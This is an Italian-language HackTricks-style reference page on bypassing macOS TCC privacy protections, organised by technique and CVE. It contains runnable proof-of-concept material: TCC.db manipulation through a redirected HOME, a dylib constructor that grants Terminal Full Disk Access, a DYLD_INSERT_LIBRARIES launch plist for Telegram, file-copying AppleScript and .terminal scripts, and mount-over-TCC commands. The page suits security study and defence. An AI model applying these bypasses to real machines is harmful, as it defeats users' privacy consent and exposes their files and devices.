# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Per funzionalità

### Bypass di scrittura

Questo non è un bypass, è solo come funziona TCC: **Non protegge dalla scrittura**. Se il Terminale **non ha accesso per leggere il Desktop di un utente, può comunque scriverci dentro**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attributo esteso `com.apple.macl`** viene aggiunto al nuovo **file** per dare all'**app del creatore** accesso per leggerlo.

### TCC ClickJacking

È possibile **mettere una finestra sopra il prompt TCC** per far sì che l'utente **accetti** senza accorgersene. Puoi trovare un PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Richiesta TCC con nome arbitrario

L'attaccante può **creare app con qualsiasi nome** (ad es. Finder, Google Chrome...) nel **`Info.plist`** e farle richiedere accesso a una posizione protetta da TCC. L'utente penserà che l'app legittima sia quella che richiede questo accesso.\
Inoltre, è possibile **rimuovere l'app legittima dal Dock e mettere quella falsa**, così quando l'utente clicca su quella falsa (che può usare la stessa icona) potrebbe chiamare quella legittima, chiedere i permessi TCC ed eseguire un malware, facendo credere all'utente che l'app legittima abbia richiesto l'accesso.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Ulteriori informazioni e PoC in:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### Bypass SSH

Per impostazione predefinita, un accesso tramite **SSH aveva "Accesso completo al disco"**. Per disabilitarlo è necessario averlo elencato ma disabilitato (rimuoverlo dall'elenco non rimuoverà quei privilegi):

![](<../../../../../images/image (1077).png>)

Qui puoi trovare esempi di come alcuni **malware siano stati in grado di bypassare questa protezione**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Nota che ora, per poter abilitare SSH, hai bisogno di **Accesso completo al disco**

### Gestione delle estensioni - CVE-2022-26767

L'attributo **`com.apple.macl`** viene dato ai file per dare a una **certa applicazione i permessi per leggerlo.** Questo attributo viene impostato quando si **trascina** un file su un'app, o quando un utente **fa doppio clic** su un file per aprirlo con l'**applicazione predefinita**.

Pertanto, un utente potrebbe **registrare un'app malevola** per gestire tutte le estensioni e chiamare i Servizi di avvio per **aprire** qualsiasi file (quindi il file malevolo avrà accesso per leggerlo).

### iCloud

L'attributo **`com.apple.private.icloud-account-access`** consente di comunicare con il servizio XPC **`com.apple.iCloudHelper`** che fornirà **token iCloud**.

**iMovie** e **Garageband** avevano questo attributo e altri che lo consentivano.

Per ulteriori **informazioni** sull'exploit per **ottenere token iCloud** da quell'attributo, controlla il talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automazione

Un'app con il permesso **`kTCCServiceAppleEvents`** sarà in grado di **controllare altre app**. Questo significa che potrebbe essere in grado di **abusare dei permessi concessi alle altre app**.

Per ulteriori informazioni sugli Apple Scripts, controlla:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Ad esempio, se un'app ha **permesso di automazione su `iTerm`**, per esempio in questo esempio **`Terminal`** ha accesso su iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Su iTerm

Terminal, che non ha FDA, può chiamare iTerm, che ce l'ha, e usarlo per eseguire azioni:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Over Finder

Oppure, se un'app ha accesso a Finder, potrebbe essere uno script come questo:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Comportamento dell'app

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Il **daemon tccd** in userland utilizzava la variabile di ambiente **`HOME`** per accedere al database utenti TCC da: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Secondo [questo post di Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e poiché il daemon TCC viene eseguito tramite `launchd` all'interno del dominio dell'utente corrente, è possibile **controllare tutte le variabili di ambiente** passate ad esso.\
Pertanto, un **attaccante potrebbe impostare la variabile di ambiente `$HOME`** in **`launchctl`** per puntare a una **directory controllata**, **riavviare** il **daemon TCC** e poi **modificare direttamente il database TCC** per concedersi **tutti i diritti TCC disponibili** senza mai richiedere all'utente finale.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Note

Le note avevano accesso a posizioni protette da TCC, ma quando viene creata una nota, questa è **creata in una posizione non protetta**. Quindi, potresti chiedere alle note di copiare un file protetto in una nota (quindi in una posizione non protetta) e poi accedere al file:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocazione

Il binario `/usr/libexec/lsd` con la libreria `libsecurity_translocate` aveva il diritto `com.apple.private.nullfs_allow` che gli permetteva di creare un **nullfs** mount e aveva il diritto `com.apple.private.tcc.allow` con **`kTCCServiceSystemPolicyAllFiles`** per accedere a ogni file.

Era possibile aggiungere l'attributo di quarantena a "Library", chiamare il servizio XPC **`com.apple.security.translocation`** e poi mappare Library a **`$TMPDIR/AppTranslocation/d/d/Library`** dove tutti i documenti all'interno di Library potevano essere **accessibili**.

### CVE-2023-38571 - Musica & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ha una caratteristica interessante: Quando è in esecuzione, **importa** i file trascinati in **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** nella "libreria multimediale" dell'utente. Inoltre, chiama qualcosa come: **`rename(a, b);`** dove `a` e `b` sono:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`

Questo comportamento **`rename(a, b);`** è vulnerabile a una **Race Condition**, poiché è possibile inserire all'interno della cartella `Automatically Add to Music.localized` un file **TCC.db** falso e poi, quando viene creata la nuova cartella (b) per copiare il file, eliminarlo e puntarlo a **`~/Library/Application Support/com.apple.TCC`**/.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Se **`SQLITE_SQLLOG_DIR="path/folder"`** significa fondamentalmente che **qualsiasi db aperto viene copiato in quel percorso**. In questo CVE, questo controllo è stato abusato per **scrivere** all'interno di un **database SQLite** che verrà **aperto da un processo con FDA il database TCC**, e poi abusare di **`SQLITE_SQLLOG_DIR`** con un **symlink nel nome del file** in modo che quando quel database è **aperto**, l'utente **TCC.db viene sovrascritto** con quello aperto.\
**Maggiore info** [**nella scrittura**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **e** [**nella conferenza**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Se la variabile di ambiente **`SQLITE_AUTO_TRACE`** è impostata, la libreria **`libsqlite3.dylib`** inizierà a **registrare** tutte le query SQL. Molte applicazioni utilizzavano questa libreria, quindi era possibile registrare tutte le loro query SQLite.

Diverse applicazioni Apple utilizzavano questa libreria per accedere a informazioni protette da TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Questa **variabile di ambiente è utilizzata dal framework `Metal`** che è una dipendenza per vari programmi, in particolare `Music`, che ha FDA.

Impostando quanto segue: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Se `path` è una directory valida, il bug verrà attivato e possiamo usare `fs_usage` per vedere cosa sta succedendo nel programma:

- un file verrà `open()`ato, chiamato `path/.dat.nosyncXXXX.XXXXXX` (X è casuale)
- uno o più `write()` scriveranno i contenuti nel file (non controlliamo questo)
- `path/.dat.nosyncXXXX.XXXXXX` verrà `renamed()` a `path/name`

È una scrittura temporanea di file, seguita da un **`rename(old, new)`** **che non è sicuro.**

Non è sicuro perché deve **risolvere i vecchi e nuovi percorsi separatamente**, il che può richiedere del tempo e può essere vulnerabile a una Condizione di Gara. Per ulteriori informazioni puoi controllare la funzione `xnu` `renameat_internal()`.

> [!CAUTION]
> Quindi, fondamentalmente, se un processo privilegiato sta rinominando da una cartella che controlli, potresti ottenere un RCE e farlo accedere a un file diverso o, come in questo CVE, aprire il file creato dall'app privilegiata e memorizzare un FD.
>
> Se il rinomina accede a una cartella che controlli, mentre hai modificato il file sorgente o hai un FD ad esso, cambi il file di destinazione (o cartella) per puntare a un symlink, così puoi scrivere quando vuoi.

Questo era l'attacco nel CVE: Ad esempio, per sovrascrivere il `TCC.db` dell'utente, possiamo:

- creare `/Users/hacker/ourlink` per puntare a `/Users/hacker/Library/Application Support/com.apple.TCC/`
- creare la directory `/Users/hacker/tmp/`
- impostare `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- attivare il bug eseguendo `Music` con questa variabile di ambiente
- catturare l'`open()` di `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X è casuale)
- qui apriamo anche questo file per scrivere e teniamo il descrittore di file
- scambiare in modo atomico `/Users/hacker/tmp` con `/Users/hacker/ourlink` **in un ciclo**
- lo facciamo per massimizzare le nostre possibilità di successo poiché la finestra di gara è piuttosto ristretta, ma perdere la gara ha un impatto trascurabile
- aspetta un po'
- verifica se abbiamo avuto fortuna
- se no, ripeti dall'inizio

Ulteriori informazioni su [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Ora, se provi a usare la variabile di ambiente `MTL_DUMP_PIPELINES_TO_JSON_FILE`, le app non si avvieranno

### Apple Remote Desktop

Come root potresti abilitare questo servizio e l'**agente ARD avrà accesso completo al disco** che potrebbe poi essere abusato da un utente per farlo copiare un nuovo **database utente TCC**.

## Per **NFSHomeDirectory**

TCC utilizza un database nella cartella HOME dell'utente per controllare l'accesso alle risorse specifiche per l'utente in **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Pertanto, se l'utente riesce a riavviare TCC con una variabile di ambiente $HOME che punta a una **cartella diversa**, l'utente potrebbe creare un nuovo database TCC in **/Library/Application Support/com.apple.TCC/TCC.db** e ingannare TCC per concedere qualsiasi autorizzazione TCC a qualsiasi app.

> [!TIP]
> Nota che Apple utilizza l'impostazione memorizzata all'interno del profilo dell'utente nell'attributo **`NFSHomeDirectory`** per il **valore di `$HOME`**, quindi se comprometti un'applicazione con permessi per modificare questo valore (**`kTCCServiceSystemPolicySysAdminFiles`**), puoi **armare** questa opzione con un bypass TCC.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Il **primo POC** utilizza [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) e [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) per modificare la **HOME** dell'utente.

1. Ottieni un blob _csreq_ per l'app target.
2. Pianta un file _TCC.db_ falso con accesso richiesto e il blob _csreq_.
3. Esporta l'entry dei Servizi di Directory dell'utente con [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifica l'entry dei Servizi di Directory per cambiare la home directory dell'utente.
5. Importa l'entry dei Servizi di Directory modificata con [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Ferma il _tccd_ dell'utente e riavvia il processo.

Il secondo POC ha utilizzato **`/usr/libexec/configd`** che aveva `com.apple.private.tcc.allow` con il valore `kTCCServiceSystemPolicySysAdminFiles`.\
Era possibile eseguire **`configd`** con l'opzione **`-t`**, un attaccante poteva specificare un **Bundle personalizzato da caricare**. Pertanto, l'exploit **sostituisce** il metodo **`dsexport`** e **`dsimport`** di cambiamento della home directory dell'utente con un **iniezione di codice configd**.

Per ulteriori informazioni controlla il [**report originale**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Per iniezione di processo

Ci sono diverse tecniche per iniettare codice all'interno di un processo e abusare dei suoi privilegi TCC:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Inoltre, la tecnica di iniezione di processo più comune per bypassare TCC trovata è tramite **plugin (load library)**.\
I plugin sono codice extra solitamente sotto forma di librerie o plist, che verranno **caricati dall'applicazione principale** e verranno eseguiti nel suo contesto. Pertanto, se l'applicazione principale aveva accesso a file TCC riservati (tramite permessi o diritti concessi), il **codice personalizzato avrà anche accesso**.

### CVE-2020-27937 - Directory Utility

L'applicazione `/System/Library/CoreServices/Applications/Directory Utility.app` aveva il diritto **`kTCCServiceSystemPolicySysAdminFiles`**, caricava plugin con estensione **`.daplug`** e **non aveva il runtime** rinforzato.

Per armare questo CVE, il **`NFSHomeDirectory`** è **cambiato** (abusando del diritto precedente) per poter **prendere il controllo del database TCC degli utenti** per bypassare TCC.

Per ulteriori informazioni controlla il [**report originale**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Il binario **`/usr/sbin/coreaudiod`** aveva i diritti `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. Il primo **consentiva l'iniezione di codice** e il secondo forniva accesso per **gestire TCC**.

Questo binario consentiva di caricare **plugin di terze parti** dalla cartella `/Library/Audio/Plug-Ins/HAL`. Pertanto, era possibile **caricare un plugin e abusare dei permessi TCC** con questo PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Per ulteriori informazioni, controlla il [**rapporto originale**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Plug-in del Layer di Astrazione del Dispositivo (DAL)

Le applicazioni di sistema che aprono il flusso della fotocamera tramite Core Media I/O (app con **`kTCCServiceCamera`**) caricano **nel processo questi plugin** situati in `/Library/CoreMediaIO/Plug-Ins/DAL` (non soggetti a restrizioni SIP).

Basta memorizzare lì una libreria con il **costruttore** comune per **iniettare codice**.

Diverse applicazioni Apple erano vulnerabili a questo.

### Firefox

L'applicazione Firefox aveva i diritti `com.apple.security.cs.disable-library-validation` e `com.apple.security.cs.allow-dyld-environment-variables`:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Per ulteriori informazioni su come sfruttare facilmente questo [**controlla il rapporto originale**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Il binario `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` aveva i diritti **`com.apple.private.tcc.allow`** e **`com.apple.security.get-task-allow`**, che consentivano di iniettare codice all'interno del processo e utilizzare i privilegi TCC.

### CVE-2023-26818 - Telegram

Telegram aveva i diritti **`com.apple.security.cs.allow-dyld-environment-variables`** e **`com.apple.security.cs.disable-library-validation`**, quindi era possibile abusarne per **ottenere accesso alle sue autorizzazioni** come registrare con la fotocamera. Puoi [**trovare il payload nel writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Nota come utilizzare la variabile env per caricare una libreria, un **plist personalizzato** è stato creato per iniettare questa libreria e **`launchctl`** è stato utilizzato per lanciarla:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Per invocazioni aperte

È possibile invocare **`open`** anche mentre si è in sandbox

### Script del Terminale

È abbastanza comune concedere **Full Disk Access (FDA)** al terminale, almeno nei computer utilizzati da persone del settore tecnologico. Ed è possibile invocare script **`.terminal`** utilizzandolo.

Gli script **`.terminal`** sono file plist come questo con il comando da eseguire nella chiave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Un'applicazione potrebbe scrivere uno script del terminale in una posizione come /tmp e lanciarlo con un comando come:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montando

### CVE-2020-9771 - bypass TCC di mount_apfs e escalation dei privilegi

**Qualsiasi utente** (anche quelli non privilegiati) può creare e montare uno snapshot di Time Machine e **accedere a TUTTI i file** di quello snapshot.\
L'**unico privilegio** necessario è che l'applicazione utilizzata (come `Terminal`) abbia accesso **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), che deve essere concesso da un amministratore.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Una spiegazione più dettagliata può essere [**trovata nel rapporto originale**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Monta sopra il file TCC

Anche se il file del database TCC è protetto, era possibile **montare sopra la directory** un nuovo file TCC.db:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Controlla il **full exploit** nel [**writeup originale**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Come spiegato nel [writeup originale](https://www.kandji.io/blog/macos-audit-story-part2), questo CVE ha abusato di `diskarbitrationd`.

La funzione `DADiskMountWithArgumentsCommon` del framework pubblico `DiskArbitration` eseguiva i controlli di sicurezza. Tuttavia, è possibile bypassarla chiamando direttamente `diskarbitrationd` e quindi utilizzare elementi `../` nel percorso e symlink.

Questo ha permesso a un attaccante di eseguire mount arbitrari in qualsiasi posizione, incluso il database TCC a causa del diritto `com.apple.private.security.storage-exempt.heritable` di `diskarbitrationd`.

### asr

Lo strumento **`/usr/sbin/asr`** consentiva di copiare l'intero disco e montarlo in un'altra posizione bypassando le protezioni TCC.

### Location Services

C'è un terzo database TCC in **`/var/db/locationd/clients.plist`** per indicare i client autorizzati ad **accedere ai servizi di localizzazione**.\
La cartella **`/var/db/locationd/` non era protetta dal montaggio DMG** quindi era possibile montare il nostro plist.

## By startup apps

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## By grep

In diverse occasioni, i file memorizzeranno informazioni sensibili come email, numeri di telefono, messaggi... in posizioni non protette (che contano come una vulnerabilità in Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Questo non funziona più, ma [**funzionava in passato**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Un altro modo utilizzando [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
